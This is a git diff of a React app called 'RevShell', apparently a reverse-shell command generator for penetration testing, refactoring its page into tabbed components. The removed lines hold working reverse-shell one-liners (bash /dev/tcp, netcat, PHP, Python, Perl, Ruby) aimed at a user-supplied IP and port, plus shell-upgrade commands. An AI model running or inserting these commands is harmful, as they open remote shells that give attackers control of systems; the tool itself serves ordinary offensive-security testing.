@@ -1,17 +1,20 @@
-import React, { useState, useEffect } from "react";
-import TextField from "@material-ui/core/TextField";
+import React from "react";
 import CssBaseline from "@material-ui/core/CssBaseline";
 import { MuiThemeProvider, createMuiTheme } from "@material-ui/core/styles";
 import Container from "@material-ui/core/Container";
 import { makeStyles } from "@material-ui/core/styles";
-import Paper from "@material-ui/core/Paper";
-import Grid from "@material-ui/core/Grid";
 import Snackbar from "@material-ui/core/Snackbar";
 import IconButton from "@material-ui/core/IconButton";
 import CloseIcon from "@material-ui/icons/Close";
 import AllInclusiveIcon from "@material-ui/icons/AllInclusive";
 import Copyright from "./Components/Copyright";
 import Box from "@material-ui/core/Box";
+import Payloads from "./Components/Payloads";
+import Upgrade from "./Components/Upgrade";
+import Bind from "./Components/Bind";
+import Stable from "./Components/Stable";
+import Tabs from "@material-ui/core/Tabs";
+import Tab from "@material-ui/core/Tab";
 
 const themeDark = createMuiTheme({
   palette: {
@@ -46,7 +49,6 @@ const useStyles = makeStyles((theme) => ({
     color: themeDark.palette.text.primary,
   },
   footer: {
-    // position: "fixed",
     bottom: 2,
     height: "40px",
     marginTop: "120px",
@@ -54,17 +56,28 @@ const useStyles = makeStyles((theme) => ({
     verticalAlign: "middle",
   },
 }));
+function TabPanel(props) {
+  const { children, value, index, ...other } = props;
+
+  return (
+    <div
+      role="tabpanel"
+      hidden={value !== index}
+      id={`simple-tabpanel-${index}`}
+      aria-labelledby={`simple-tab-${index}`}
+      {...other}
+    >
+      {value === index && <Box p={3}>{children}</Box>}
+    </div>
+  );
+}
 const App = () => {
   const classes = useStyles();
-  const [ip, setIp] = useState("10.10.10.10");
-  const [port, setPort] = useState(1337);
-  const [mylist, setMylist] = useState([]);
-
   const [open, setOpen] = React.useState(false);
+  const [value, setValue] = React.useState(0);
   const handleClick = () => {
     setOpen(true);
   };
-
   const handleClose = (event, reason) => {
     if (reason === "clickaway") {
       return;
@@ -72,92 +85,13 @@ const App = () => {
 
     setOpen(false);
   };
-
+  const handleChange = (event, newValue) => {
+    setValue(newValue);
+  };
   const copyToClipboard = (e, item) => {
     navigator.clipboard.writeText(item.value);
     handleClick();
   };
-  const mylist2 = [
-    {
-      name: "Python 2",
-      value: `python -c 'import pty; pty.spawn("/bin/bash")'`,
-    },
-    {
-      name: "Python 3",
-      value: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
-    },
-    {
-      name: "Bash",
-      value: `echo os.system('/bin/bash')`,
-    },
-    {
-      name: "Perl",
-      value: `perl -e 'exec "/bin/bash";'`,
-    },
-  ];
-  const list = [
-    {
-      name: "Bash",
-      value: "bash -i >& /dev/tcp/MYIP/MYPORT 0>&1",
-    },
-    {
-      name: "PHP",
-      value: `php -r '$sock=fsockopen("MYIP",MYPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
-    },
-    {
-      name: "Python",
-      value: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MYIP",MYPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
-    },
-    {
-      name: "NC v1",
-      value: `nc -e /bin/sh MYIP MYPORT`,
-    },
-    {
-      name: "NC v2",
-      value: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MYIP MYPORT >/tmp/f`,
-    },
-    {
-      name: "Perl",
-      value: `perl -e 'use Socket;$i="MYIP";$p=MYPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
-    },
-    {
-      name: "Ruby",
-      value: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
-    },
-  ];
-  useEffect(() => {
-    const generateList = () => {
-      console.log(ip);
-      setMylist(
-        list.map((item) => {
-          return {
-            name: item.name,
-            value: item.value.replace("MYIP", ip).replace("MYPORT", port),
-          };
-        })
-      );
-    };
-    generateList();
-  }, [ip, port]); // eslint-disable-line react-hooks/exhaustive-deps
-  const FormRow = ({ item }) => {
-    return (
-      <React.Fragment>
-        <Grid item xs={12}>
-          <div>
-            {item.name}
-            <Paper
-              elevation={3}
-              className={classes.paper}
-              onClick={(e) => copyToClipboard(e, item)}
-            >
-              {item.value}
-            </Paper>
-          </div>
-        </Grid>
-      </React.Fragment>
-    );
-  };
-
   return (
     <MuiThemeProvider theme={themeDark}>
       <CssBaseline />
@@ -165,48 +99,24 @@ const App = () => {
         <h1>
           RevShell <AllInclusiveIcon />
         </h1>
-        <form className={classes.root}>
-          <TextField
-            color="secondary"
-            id="outlined-multiline-flexible"
-            multiline
-            label="IP Address"
-            variant="outlined"
-            InputLabelProps={{
-              shrink: true,
-            }}
-            value={ip}
-            onChange={(e) => setIp(e.target.value)}
-          />
-          <TextField
-            color="secondary"
-            id="outlined-multiline-flexible"
-            multiline
-            label="Port"
-            variant="outlined"
-            InputLabelProps={{
-              shrink: true,
-            }}
-            value={port}
-            onChange={(e) => setPort(e.target.value)}
-          />
-        </form>
-        <Grid container spacing={1}>
-          <Grid container item spacing={1}>
-            {mylist.map((item) => (
-              <FormRow item={item} />
-            ))}
-          </Grid>
-        </Grid>
-        <br />
-        <h2>Shell Upgrade</h2>
-        <Grid container spacing={1}>
-          <Grid container item spacing={1}>
-            {mylist2.map((item) => (
-              <FormRow item={item} />
-            ))}
-          </Grid>
-        </Grid>
+        <Tabs value={value} onChange={handleChange} aria-label="tabs">
+          <Tab label="Reverse Shell" />
+          <Tab label="Bind Shell" />
+          <Tab label="Shell Upgrade" />
+          <Tab label="Stable Shell" />
+        </Tabs>
+        <TabPanel value={value} index={0}>
+          <Payloads classes={classes} copyToClipboard={copyToClipboard} />
+        </TabPanel>
+        <TabPanel value={value} index={1}>
+          <Bind classes={classes} copyToClipboard={copyToClipboard} />
+        </TabPanel>
+        <TabPanel value={value} index={2}>
+          <Upgrade classes={classes} copyToClipboard={copyToClipboard} />
+        </TabPanel>
+        <TabPanel value={value} index={3}>
+          <Stable classes={classes} copyToClipboard={copyToClipboard} />
+        </TabPanel>
         <Snackbar
           anchorOrigin={{
             vertical: "top",
